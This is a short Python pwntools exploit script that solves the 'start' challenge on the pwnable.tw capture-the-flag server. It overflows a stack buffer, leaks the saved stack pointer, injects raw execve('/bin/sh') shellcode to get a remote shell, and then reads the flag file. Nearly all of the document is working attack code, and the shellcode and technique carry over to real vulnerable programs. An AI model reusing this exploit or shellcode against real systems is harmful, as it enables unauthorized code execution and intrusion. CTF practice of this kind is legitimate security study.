from pwn import *

def pwn_start(r):

    # Buffer overflow read syscall to jump again to _start
    r.sendafter(b"Let's start the CTF:", b"a" * 20 + p32(0x08048087))

    # Now write gives us esp saved value in stack
    esp_pushed_value = u32(r.recv(4))
    system_bin_sh    = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

    r.send(b"a" * 20 + p32(esp_pushed_value + 20) + system_bin_sh)
    r.recv()

context.log_level = "debug"
r = remote("chall.pwnable.tw", 10000)
pwn_start(r)

r.sendline(b'cat /home/start/flag')
flag = r.recv().decode()[:-1]

r.close()

print("Flag is:", flag)